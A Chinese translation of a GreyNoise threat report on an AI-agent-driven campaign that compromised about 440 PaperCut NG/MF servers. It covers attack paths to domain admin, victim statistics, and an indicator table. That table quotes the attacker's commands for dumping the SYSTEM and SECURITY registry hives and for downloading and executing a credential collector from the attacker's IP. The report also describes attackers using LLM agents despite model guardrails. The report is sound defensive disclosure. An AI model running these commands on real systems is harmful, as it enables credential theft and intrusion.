---
title: AI辅助攻击案例:PaperCut攻击行动
url: https://mp.weixin.qq.com/s/wphqkNmFUHo1NMndNVFucQ
source: Doonsec's feed
date: 2026-09-18
fetch_date: 2026-09-19T06:59:56.219925
---

# AI辅助攻击案例:PaperCut攻击行动

# AI辅助攻击案例:PaperCut攻击行动

转译
转译

AI与安全

![]()

在小说阅读器读本章

去阅读

![]()

在公众号小说中沉浸阅读

![](https://mmbiz.qpic.cn/mmbiz_png/ccVb6wGibibCFSzfc96j1V7x6sSF6iccBzJBfyFmesVKueSj9sKIqU6dsuxL73mQvAx66rMk1QMeWw0tkPFZhKjrWapmdFNRibocRQTtrJjrdcQ/640?wx_fmt=png&from=appmsg)

导语：2026 年 8 月 31 日，一个疑似使用俄语的攻击者，借助 AI 与数百个 AI 智能体（Agent），对打印管理软件 PaperCut NG/MF 发起了一场全球性的攻击行动——至少攻陷 440 个实例，波及 48 个国家的 395 个组织。攻击者从空白环境到拿下首个真实受害者，仅用了不到 4 小时。以下是安全公司 GreyNoise 对此次行动的完整分析。

---

GreyNoise 通过其全球观测网格（Global Observation Grid，GOG）观测攻击者活动。GOG 是一个由传感器组成的网络，能够将攻击者的扫描与利用行为吸引到我们掌控的基础设施上。这使我们能够直接研究攻击者的基础设施、工具和战术手法（tradecraft），而无需等待受害者调查。自 2026 年 7 月初以来，GreyNoise 一直在追踪 IP 地址 45.142.193[.]132 的恶意使用情况，因为该 IP 被用于攻击面向互联网的技术与设备，涉及 Palo Alto、Ubiquiti、Citrix、SonicWall 和 Proxmox VE 等厂商的产品。

2026 年 8 月 31 日，一个疑似使用俄语的恶意网络行为者（MCA）利用 45.142.193[.]132 以及人工智能（AI）来开发、测试并使用针对 PaperCut NG/MF 的漏洞利用程序（涉及 CVE-2026-81578 和 CVE-2026-82078）。PaperCut 是一款打印管理软件，可帮助组织跟踪、计费并管理打印、复印和扫描任务。PaperCut 提供云端和自托管两种版本；PaperCut NG 和 MF 是自托管的 Java Web 应用程序，默认情况下在 Windows 上以 SYSTEM 级权限运行，通常已加入域并与 Active Directory 集成。在开发与测试漏洞利用程序的过程中，攻击者搭建并攻击了一个实验室环境，其中包括存在漏洞的 PaperCut 软件和一台 Active Directory 服务器。与此同时，攻击者还并行使用互联网扫描服务 Netlas.io（使用了一个已被识别的 API 密钥）来构建目标清单。

攻击者在其自托管实验室环境中实现远程代码执行（RCE）和凭据窃取后，使用由 OpenAI 的 Codex（作为编排框架 harness）、一个 DeepSeek 模型（而非 OpenAI 模型）以及各种公开可用的攻击性安全工具所驱动的数百个 AI 智能体，机会主义地攻陷了至少 440 个 PaperCut MF/NG 实例，涉及 48 个国家中 395 个已识别的受害组织。此外，还有一些真实受害者无法归因到具名组织。攻击者确实明确尝试避免针对 28 个已识别国家的实体；然而，我们观测到的受害者情况显示，这种刻意的克制在某些情况下并未奏效。

显而易见，大语言模型（LLM）正使攻击者能够以更快的速度和更大的规模行动。攻击者从空白的工作空间开始，用了不到 4 小时就首次对真实受害者实现了 RCE，又过了大约 2 小时取得首个域管理员权限；而当整个攻击行动全面启动后，攻击者在 26 秒内就攻陷了至少 11 个组织。在其中一起案例中，攻击者针对美国一所高中，从初始访问到获得完整域管理员权限仅用了 7 分钟。不过，攻击者并非在所有受害者身上都同样得手——GreyNoise 观测到，攻击者仅对 12 个受害组织成功取得了域管理员权限。

攻击者并未立即对所有已攻陷的受害者进行后续行动，因此在初始访问与取得域管理员权限之间出现了数天的延迟，而这仅仅是因为攻击者没有采取行动所致。在成功取得域管理员权限的案例中，攻击者最快仅用了 5 分钟，最长用了 144 分钟。截至 GreyNoise 最后一次观测时，攻击者尚未对其他受害者取得域管理员权限。在至少一起针对被视为存在漏洞的 PaperCut 实例的攻击中，Cloudflare 的 Web 应用防火墙（WAF）成功阻止了攻击者。面对 AI 赋能的威胁，对环境的根本性加固仍然至关重要。

目前尚不清楚该行为者是仅专注于获取访问权限、以便移交给其他关联行为者，还是会直接利用所获得的访问权限来达成后续目标，例如数据窃取或部署勒索软件。过去，涉及利用 PaperCut 漏洞的其他入侵事件曾导致勒索。GreyNoise 已与业界领先的应急响应服务机构合作，全天候开展受害者通报工作。

---

![](https://mmbiz.qpic.cn/mmbiz_png/ccVb6wGibibCEjK4Hx6oC80DHvlaF2vofZiczNljQKbjAiavjpNkPKc3icGavr0T82ib0txjPiboxkGdIMaAFT7SgISNXa79aFojHtTn8q16xQETBs/640?wx_fmt=png&from=appmsg)

核心要点

- 尽管美国的前沿模型设有防护栏（guardrails），攻击者仍在全球范围内使用多种大语言模型实施入侵；
- AI 能够实现快速、高效的复杂网络行动编排；然而，若约束不当，智能体（agentic）操作可能会偏离预期行为，并带来操作风险；
- 面对智能体攻击，组织并非无能为力，传统的安全加固确实对组织的安全态势具有积极影响。

---

入侵攻击生命周期

在成功取得域管理员权限的案例中，GreyNoise 观测到了三种攻击路径：

攻击路径 A： 如果被攻陷的 PaperCut 主机是域成员，攻击者会提取 LSASS 进程内存和注册表机密，以恢复高权限凭据，并对域控制器实施 pass-the-hash（哈希传递）攻击。

攻击路径 B： 在受害者尚未修补 CVE-2021-42278 和 CVE-2021-42287 的情况下，攻击者使用了 “noPac” 攻击。

攻击路径 C： 如果被攻陷的 PaperCut 主机就位于域控制器本身，或以域管理员服务账户运行，攻击者会直接将其新建的账户添加到 Domain Admins（域管理员组）。

在所有攻击路径中，攻击者都使用 DCSync 创建了完整的 NTDS.DIT 转储，以窃取组织的凭据。

---

失陷指标（IOC）

注意：这些 IOC 并非详尽无遗，因为由 AI 赋能的攻击者会持续根据需要进行即时调整。GreyNoise 将继续在GitHub上添加新的 IOC。

| 观测指标 | 描述 |
| --- | --- |
| 45.142.193.132 | 用于编排和执行该攻击行动 |
| 45.158.196.75 | 用于执行该攻击行动 |
| 528cd4e69ecfa5191adbcf6ef28667bf（lsa\_read.exe） | Rust 编写的 LSA 机密读取器 |
| ce870a91e8d27e8f663f0687abc60b04（save\_hives.exe） | 注册表配置单元转储工具 |
| a6437ac3d6798090a218520985d36a3f（collect\_custom.exe） | Rust 编写的自定义收集器 |
| fc92dfafa7aa741c5f2b9cbcf75d1d19（lsa*collect*small.exe） | Rust 编写的 LSA bootkey 收集器 |
| 974decb9ff4c8f9ccb0937c96d513347（certipy.exe） | ADCS 滥用工具 |
| Administrator17 | 攻击者创建的账户 |
| C:\Windows\Temp\pc-sys.hiv | 为外传而暂存的 SYSTEM 配置单元 |
| C:\Windows\Temp\pc-sec.hiv | 为外传而暂存的 SECURITY 配置单元 |
| C:\Windows\Temp\pc-security.hiv | 为外传而暂存的 SECURITY 配置单元 |
| C:\Windows\Temp\pc-system.hiv | 为外传而暂存的 SYSTEM 配置单元 |
| C:\ProgramData\pc-sys-reg.hiv | 为外传而暂存的 SYSTEM 配置单元（备用路径） |
| C:\Windows\Temp\pc-\*.b64 | 为 HTTP 外传而暂存的 Base64 编码配置单元分块 |
| C:\ProgramData\ligolo-agent.exe | 为持久化访问而释放的 Ligolo 隧道代理 |
| ...\PaperCut MF\server\custom\web\pcp\_\<10随机字符\>.txt | 成功利用漏洞的证据 |
| `reg save HKLM\SYSTEM "C:\Windows\Temp\pc-system.hiv" /y & certutil -encode "C:\Windows\Temp\pc-system.hiv" "C:\Windows\Temp\pc-system.b64" & type "C:\Windows\Temp\pc-system.b64"` | 将 SYSTEM 注册表配置单元转储到磁盘、进行 Base64 编码并验证输出，为外传做准备 |
| `reg save HKLM\SECURITY "C:\Windows\Temp\pc-security.hiv" /y & certutil -encode "C:\Windows\Temp\pc-security.hiv" "C:\Windows\Temp\pc-security.b64" & type "C:\Windows\Temp\pc-security.b64"` | 将 SECURITY 注册表配置单元转储到磁盘、进行 Base64 编码并验证输出，为外传做准备 |
| `certutil -urlcache -split -f "http://45.142.193[.]132:8000/lsa_collect.exe" C:\Windows\Temp\lsa_collect.exe & C:\Windows\Temp\lsa_collect.exe` | 下载并执行 LSA bootkey 收集器 |
| http://45.142.193.132:8089/agent5.exe | 攻击者使用的 Ligolo-ng 的 URL |
| C:\ProgramData\LegitSvc\legit-svc.exe | 攻击者使用的 Ligolo-ng 名称与路径 |
| C:\ProgramData\LegitSvc\legit-svc-backup.exe | 攻击者使用的 Ligolo-ng 名称与路径 |

---

攻击者工具包

该 MCA 拥有一套公开可用的攻击性安全工具库，用于扩大对企业环境的访问。请注意，并非所有这些工具都在本次攻击行动中被观测到实际使用。

![](https://mmbiz.qpic.cn/mmbiz_png/ccVb6wGibibCG4nxXicOLb5Ke8NSpstD6QQxqdf55NIccxdlMb2C18BVaB4DuZ1aNrhZNDib0mx9ibFqUXsMA3zSmhjmy9kz8LQNt4uXc7fLPyXI/640?wx_fmt=png&from=appmsg)

目标与受害者分析

此次攻击行动似乎是机会主义性质的。美国境内的目标高度集中在教育行业；不过，这更可能归因于 PaperCut NG/MF 的客户群体分布。

攻击者使用了一份沿袭自以往攻击行动的“需回避国家”清单。目前尚不确定为何该 MCA 的智能体会发生偏离，但这正是 “AI 特工失控”（Agents Gone Wild）的一个绝佳例证。按顺序需回避的国家包括：俄罗斯、中国、中国香港、泰国、伊朗、委内瑞拉、白俄罗斯、哈萨克斯坦、吉尔吉斯斯坦、塔吉克斯坦、土库曼斯坦、乌兹别克斯坦、亚美尼亚、阿塞拜疆、摩尔多瓦、乌克兰、巴西、越南、印度尼西亚、巴基斯坦、坦桑尼亚、孟加拉国、阿富汗、土耳其、南非、纳米比亚、尼日利亚和津巴布韦。

各国受害数量

| 国家 | 受害者 | 凭据窃取 | OS/域机密 | 域管理员 |
| --- | --- | --- | --- | --- |
| 美国 | 98 | 59 | 31 | 1 |
| 英国 | 59 | 40 | 20 | 3 |
| 法国 | 31 | 23 | 12 | 1 |
| 西班牙 | 31 | 20 | 8 | — |
| 加拿大 | 24 | 10 | 8 | 3 |
| 比利时 | 16 | 13 | 8 | 1 |
| 葡萄牙 | 16 | 9 | 5 | 1 |
| 澳大利亚 | 15 | 8 | 4 | — |
| 德国 | 15 | 8 | 2 | 1 |
| 瑞士 | 14 | 9 | 1 | — |
| 意大利 | 13 | 8 | 7 | — |
| 中国台湾 | 12 | 11 | 10 | — |
| 新加坡 | 11 | 10 | 1 | — |
| 荷兰 | 9 | 6 | 5 | — |
| 南非 | 9 | 2 | 1 | 1 |
| 瑞典 | 8 | 5 | 3 | — |
| 巴西 | 5 | 2 | 0 | — |
| 马来西亚 | 5 | 4 | 3 | — |
| 丹麦 | 4 | 3 | 1 | — |
| 爱尔兰 | 4 | 3 | 2 | — |
| 新西兰 | 4 | 3 | 1 | — |
| 阿根廷 | 3 | 1 | 0 | — |
| 印度 | 3 | 3 | 2 | — |
| 柬埔寨 | 2 | 2 | 2 | — |
| 智利 | 2 | 1 | 1 | — |
| 芬兰 | 2 | 1 | 1 | — |
| 希腊 | 2 | 1 | 0 | — |
| 日本 | 2 | 0 | 0 | — |
| 波多黎各 | 2 | 2 | 0 | — |
| 奥地利 | 1 | 1 | 0 | — |
| 博茨瓦纳 | 1 | 1 | 1 | — |
| 保加利亚 | 1 | 0 | 0 | — |
| 中国 | 1 | 0 | 0 | — |
| 哥伦比亚 | 1 | 0 | 0 | — |
| 厄瓜多尔 | 1 | 0 | 0 | — |
| 爱沙尼亚 | 1 | 1 | 1 | — |
| 哈萨克斯坦 | 1 | 0 | 0 | — |
| 立陶宛 | 1 | 1 | 1 | — |
| 墨西哥 | 1 | 1 | 1 | — |
| 纳米比亚 | 1 | 1 | 0 | — |
| 尼日利亚 | 1 | 1 | 1 | — |
| 巴基斯坦 | 1 | 0 | 0 | — |
| 菲律宾 | 1 | 1 | 0 | — |
| 波兰 | 1 | 1 | 1 | — |
| 罗马尼亚 | 1 | 1 | 1 | — |
| 沙特阿拉伯 | 1 | 1 | 0 | — |
| 斯里兰卡 | 1 | 1 | 1 | — |
| 津巴布韦 | 1 | 1 | 0 | — |
| 总计 | 440 | 280 | 147 | 12 |

各行业受害数量

| 行业 | 受害者 | 凭据窃取 | OS/域机密 | 域管理员 |
| --- | --- | --- | --- | --- |
| 教育 | 204 | 129 | 67 | 7 |
| 其他/未分类 | 51 | 32 | 18 | 1 |
| 零售/商业/专业服务 | 38 | 28 | 16 | 2 |
| 房地产/共享办公/酒店业 | 29 | 20 | 6 | — |
| IT/托管服务商（MSP）/打印设备经销商 | 25 | 17 | 8 | — |
| 非营利/宗教/慈善机构 | 21 | 16 | 9 | 2 |
| 未知（未归因） | 15 | 6 | 3 | — |
| 图书馆/档案馆 | 13 | 9 | 8 | — |
| 制造/工业/能源/公用事业 | 13 | 7 | 3 | — |
| 政府/公共部门 | 9 | 6 | 3 | — |
| 医疗/社会护理 | 8 | 3 | 2 | — |
| 法律 | 8 | 3 | 2 | — |
| 金融/保险 | 6 | 4 | 2 | — |
| 总计 | 440 | 280 | 147 | 12 |

---

GreyNoise 将继续监测相关情况，并视需要发布更新。本文是 GreyNoise Labs 博客上完整深入版本的摘要。

---

关联阅读

[![](https://mmbiz.qpic.cn/mmbiz_jpg/ccVb6wGibibCGbpWoZGkfJfFNDU9g9PWI78vJNNQh1er7eQ264ibicMc8Da1GnzibDDsUCpwshzicnQKqWedatvF5ibpic7GqdZOnvBAFwQCmAdxpibE/640?wx_fmt=jpeg)](https://mp.weixin.qq.com/s?__biz=Mzg5NTMxMjQ4OA==&mid=2247486861&idx=1&sn=8b8f3f8331f28e209f2993eee1cc22a9&scene=21#wechat_redirect)

[泛安全可能是AI带来的最大市场，但现有安全思路都不对](https://mp.weixin.qq.com/s?__biz=Mzg5NTMxMjQ4OA==&mid=2247486861&idx=1&sn=8b8f3f8331f28e209f2993eee1cc22a9&scene=21#wechat_redirect)

来源说明：本文由 GreyNoise 的《Agents Gone Wild: An AI-Orchestrated Global Campaign Against PaperCut NG/MF》翻译整理，原文发表于 2026 年 9 月 9 日。

原文链接：https://www.greynoise.io/blog/ai-orchestrated-campaign-against-papercut-ng-mf

预览时标签不可点

![]()

微信扫一扫
关注该公众号

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpi...